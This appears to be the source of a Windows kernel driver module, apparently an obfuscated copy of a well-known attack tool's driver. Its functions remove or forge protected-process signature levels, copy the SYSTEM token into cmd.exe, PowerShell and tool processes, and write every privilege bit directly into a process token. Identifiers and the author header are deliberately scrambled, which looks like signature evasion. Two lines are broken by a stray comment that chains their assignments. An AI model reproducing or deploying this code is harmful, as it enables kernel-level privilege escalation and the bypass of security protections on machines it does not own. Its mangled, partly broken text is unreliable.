/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kkll_m_ProCeSs.h"

const ULONG EPROCESS_OffSetTable[fPnkOsIndex_MAX][EProCeSs_MAX] =
{					/*  EProCeSsNext, EProCeSsFlags2, TokenPrivs, SignatureProtect */
					/*  dt nt!_EPROCESS -n ActiveProcessLinks -n Flags2 -n SignatureLevel */
#if defined(_M_IX86)
/* UNK	*/	{0},
/* XP	*/	{0x0088},
/* 2K3	*/	{0x0098},
/* VISTA*/	{0x00a0, 0x0224, 0x0040},
/* 7	*/	{0x00b8, 0x026c, 0x0040},
/* 8	*/	{0x00b8, 0x00c0, 0x0040, 0x02d4},
/* BLUE	*/	{0x00b8, 0x00c0, 0x0040, 0x02cc},
/* 10_1507*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1511*/{0x00b8, 0x00c0, 0x0040, 0x02dc},
/* 10_1607*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1703*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1709*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1803*/{0x00b8, 0x00c0, 0x0040, 0x02ec},
/* 10_1809*/{0x00b8, 0x00c8, 0x0040, 0x02f4},
/* 10_1903*/{0x00b8, 0x00c8, 0x0040, 0x0364},
/* 10_1909*/{0x00b8, 0x00c8, 0x0040, 0x0364}, // ?
/* 10_2004*/{0x00e8, 0x00f8, 0x0040, 0x03a4},
#else
/* UNK	*/	{0},
/* XP	*/	{0},
/* 2K3	*/	{0x00e0},
/* VISTA*/	{0x00e8, 0x036c, 0x0040},
/* 7	*/	{0x0188, 0x043c, 0x0040},
/* 8	*/	{0x02e8, 0x02f8, 0x0040, 0x0648},
/* BLUE	*/	{0x02e8, 0x02f8, 0x0040, 0x0678},
/* 10_1507*/{0x02f0, 0x0300, 0x0040, 0x06a8},
/* 10_1511*/{0x02f0, 0x0300, 0x0040, 0x06b0},
/* 10_1607*/{0x02f0, 0x0300, 0x0040, 0x06c8},
/* 10_1703*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1709*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1803*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1809*/{0x02e8, 0x0300, 0x0040, 0x06c8},
/* 10_1903*/{0x02f0, 0x0308, 0x0040, 0x06f8},
/* 10_1909*/{0x02f0, 0x0308, 0x0040, 0x06f8}, // ?
/* 10_2004*/{0x0448, 0x0460, 0x0040, 0x0878},
#endif
};

NTSTATUS kkll_m_ProCeSs_enum(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer, PKKLL_M_PROCESS_CALLBACK callback, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	for(
		pProcess = PsInitialSystemProcess;
		NT_SUCCESS(status) && (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsNext])) - EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsNext]) != PsInitialSystemProcess;
		pProcess = (PEPROCESS) ((ULONG_PTR) (*(PVOID *) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsNext])) - EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsNext])
		)
	{
		status = callback(szBufferIn, bufferIn, outBuffer, pProcess, pvArg);
	}
	return status;
}

NTSTATUS kkll_m_ProCeSs_list_callback(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status;
	PJlzW_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;

	HANDLE ProCeSsId = PsGetProcessId(pProcess);
	PCHAR ProCeSsName = PsGetProcessImageFileName(pProcess);

	status = kprintf(outBuffer, L"%u\t%-14S", ProCeSsId, ProCeSsName);
	if(NT_SUCCESS(status))
	{
		if(fPnkOsIndex >= fPnkOsIndex_VISTA)
		{
			pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsFlags2]);
			status = kprintf(outBuffer, L"\t%s", (*pFlags2 & TOKEN_FROZEN_MASK) ? L"F-Tok" : L"     ");
			if(NT_SUCCESS(status))
			{
				if(fPnkOsIndex >= fPnkOsIndex_8)
				{
					pSignatureProtect = (PJlzW_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][SignatureProtect]);
					status = kprintf(outBuffer, L"\tSig %02x/%02x", pSignatureProtect->SignatureLevel, pSignatureProtect->SectionSignatureLevel);
					if(NT_SUCCESS(status) && (fPnkOsIndex > fPnkOsIndex_8))
						status = kprintf(outBuffer, L" [%1x-%1x-%1x]", pSignatureProtect->Protection.Type, pSignatureProtect->Protection.Audit, pSignatureProtect->Protection.Signer);
				}
				else if(*pFlags2 & PROTECTED_PROCESS_MASK)
				{
					status = kprintf(outBuffer, L"\tP-Proc");
				}
			}
		}
		if(NT_SUCCESS(status))
			kprintf(outBuffer, L"\n");
	}
	return status;
}

NTSTATUS kkll_m_ProCeSs_protect(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer)
{
	NTSTATUS status;
	PEPROCESS pProcess = NULL;
	PJlzW_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
	PULONG pFlags2 = NULL;
	PMIMIDRV_PROCESS_PROTECT_INFORMATION pInfos = (PMIMIDRV_PROCESS_PROTECT_INFORMATION) bufferIn;

	if(fPnkOsIndex >= fPnkOsIndex_VISTA)
	{
		if(pInfos && (szBufferIn == sizeof(MIMIDRV_PROCESS_PROTECT_INFORMATION)))
		{
			status = PsLookupProcessByProcessId((HANDLE) pInfos->ProCeSsId, &pProcess);
			if(NT_SUCCESS(status))
			{
				if(fPnkOsIndex < fPnkOsIndex_8)
				{
					pFlags2 = (PULONG) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsFlags2]);
					if(pInfos->SignatureProtection.SignatureLevel)
						*pFlags2 |= PROTECTED_PROCESS_MASK;
					else
						*pFlags2 &= ~PROTECTED_PROCESS_MASK;
				}
				else
				{
					pSignatureProtect = (PJlzW_PROCESS_SIGNATURE_PROTECTION) (((ULONG_PTR) pProcess) + EPROCESS_OffSetTable[fPnkOsIndex][SignatureProtect]);
					pSignatureProtect->SignatureLevel = pInfos->SignatureProtection.SignatureLevel;
					pSignatureProtect->SectionSignatureLevel = pInfos->SignatureProtection.SectionSignatureLevel;
					if(fPnkOsIndex > fPnkOsIndex_8)
						pSignatureProtect->Protection =  pInfos->SignatureProtection.Protection;
				}
				ObDereferenceObject(pProcess);
			}
		}
		else status = STATUS_INVALID_PARAMETER;
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}

NTSTATUS kkll_m_ProCeSs_tOKEn(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PMIMIDRV_PROCESS_TOKEN_FROM_TO pTokenFromTo = (PMIMIDRV_PROCESS_TOKEN_FROM_TO) bufferIn;
	ULONG fromProcessId, toProcessId;
	HANDLE hFromProcess, hFromProcessToken;
	PEPROCESS pFromProcess = PsInitialSystemProcess, pToProcess = NULL;

	if(pTokenFromTo && (szBufferIn == sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO)))
	{
		if(pTokenFromTo->fromProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->fromProcessId, &pFromProcess);
		if(NT_SUCCESS(status) && pTokenFromTo->toProcessId)
			status = PsLookupProcessByProcessId((HANDLE) pTokenFromTo->toProcessId, &pToProcess);
	}

	if(NT_SUCCESS(status))
	{
		status = ObOpenObjectByPointer(pFromProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hFromProcess);
		if(NT_SUCCESS(status))
		{
			status = ZwOpenProcessTokenEx(hFromProcess, 0, OBJ_KERNEL_HANDLE, &hFromProcessToken);
			if(NT_SUCCESS(status))
			{
				status = kprintf(outBuffer, L"Token from %u/%-14S\n", PsGetProcessId(pFromProcess), PsGetProcessImageFileName(pFromProcess));
				if(NT_SUCCESS(status))
				{
					if(pToProcess)
						status = kkll_m_ProCeSs_tOKEn_toProcess(szBufferIn, bufferIn, outBuffer, hFromProcessToken, pToProcess);
					else
						status = kkll_m_ProCeSs_enum(szBufferIn, bufferIn, outBuffer, kkll_m_ProCeSs_systOKEn_callback, hFromProcessToken);
				}
				ZwClose(hFromProcessToken);
			}
			ZwClose(hFromProcess);
		}
	}

	if(pToProcess)
		ObDereferenceObject(pToProcess);

	if(pFromProcess && (pFromProcess != PsInitialSystemProcess))
		ObDereferenceObject(pFromProcess);

	return status;
}

NTSTATUS kkll_m_ProCeSs_systOKEn_callback(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PCHAR ProCeSsName = PsGetProcessImageFileName(pProcess);

	if((RtlCompareMemory("NoTKaZ.exe", ProCeSsName, 13) == 13) || (RtlCompareMemory("cmd.exe", ProCeSsName, 7) == 7) || (RtlCompareMemory("powershell.exe", ProCeSsName, 14) == 14))
		status = kkll_m_ProCeSs_tOKEn_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);

	return status;
}

NTSTATUS kkll_m_ProCeSs_tOKEn_toProcess(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	PROCESS_ACCESS_TOKEN ProcessTokenInformation = {NULL, NULL};
	HANDLE hToProcess;
	PULONG pFlags2 = NULL;
	NTSTATUS status;
	HANDLE ProCeSsId = PsGetProcessId(pToProcess);
	PCHAR ProCeSsName = PsGetProcessImageFileName(pToProcess);

	status = ObOpenObjectByPointer(pToProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hToProcess);
	if(NT_SUCCESS(status))
	{
		status = ZwDuplicateToken(hSrcToken, 0, NULL, FALSE, TokenPrimary, &ProcessTokenInformation.Token);
		if(NT_SUCCESS(status))
		{
			if(fPnkOsIndex >= fPnkOsIndex_VISTA)
			{
				pFlags2 = (PULONG) (((ULONG_PTR) pToProcess) + EPROCESS_OffSetTable[fPnkOsIndex][EProCeSsFlags2]);
				if(*pFlags2 & TOKEN_FROZEN_MASK)
					*pFlags2 &= ~TOKEN_FROZEN_MASK;
				else
					pFlags2 = NULL;
			}

			status = ZwSetInformationProcess(hToProcess, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
			if(NT_SUCCESS(status))
				status = kprintf(outBuffer, L" * to %u/%-14S\n", ProCeSsId, ProCeSsName);
			else
				status = kprintf(outBuffer, L" ! ZwSetInformationProcess 0x%08x for %u/%-14S\n", status, ProCeSsId, ProCeSsName);

			if((fPnkOsIndex >= fPnkOsIndex_VISTA) && pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;

			ZwClose(ProcessTokenInformation.Token);
		}
		ZwClose(hToProcess);
	}
	return status;
}

NTSTATUS kkll_m_ProCeSs_fullPRIViLeGes(SIZE_T szBufferIn, PVOID bufferIn, PJlzW_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;
	PACCESS_TOKEN pAccessToken = NULL;
	PJlzW_NT6_PRIVILEGES pPrivileges;
	PULONG pPid = (PULONG) bufferIn;

	if(fPnkOsIndex >= fPnkOsIndex_VISTA)
	{
		if(pPid && (szBufferIn == sizeof(ULONG)))
			status = PsLookupProcessByProcessId((HANDLE) *pPid, &pProcess);
		else
			pProcess = PsGetCurrentProcess();

		if(NT_SUCCESS(status) && pProcess)
		{
			if(pAccessToken = PsReferencePrimaryToken(pProcess))
			{
				status = kprintf(outBuffer, L"All PRIViLeGes for the access tOKEn from %u/%-14S\n", PsGetProcessId(pProcess), PsGetProcessImageFileName(pProcess));
				
				pPrivileges = (PJlzW_NT6_PRIVILEGES) (((ULONG_PTR) pAccessToken) + EPROCESS_OffSetTable[fPnkOsIndex][TokenPrivs]);
				pPrivileges->Present[0] = pPrivileges->Enabled[0] /*= pPrivileges->EnabledByDefault[0]*/ = 0xfc;
				pPrivileges->Present[1] = pPrivileges->Enabled[1] /*= pPrivileges->EnabledByDefault[1]*/ = //...0xff;
				pPrivileges->Present[2] = pPrivileges->Enabled[2] /*= pPrivileges->EnabledByDefault[2]*/ = //...0xff;
				pPrivileges->Present[3] = pPrivileges->Enabled[3] /*= pPrivileges->EnabledByDefault[3]*/ = 0xff;
				pPrivileges->Present[4] = pPrivileges->Enabled[4] /*= pPrivileges->EnabledByDefault[4]*/ = 0x0f;

				PsDereferencePrimaryToken(pAccessToken);
			}

			if(pProcess != PsGetCurrentProcess())
				ObDereferenceObject(pProcess);
		}
	}
	else status = STATUS_NOT_SUPPORTED;

	return status;
}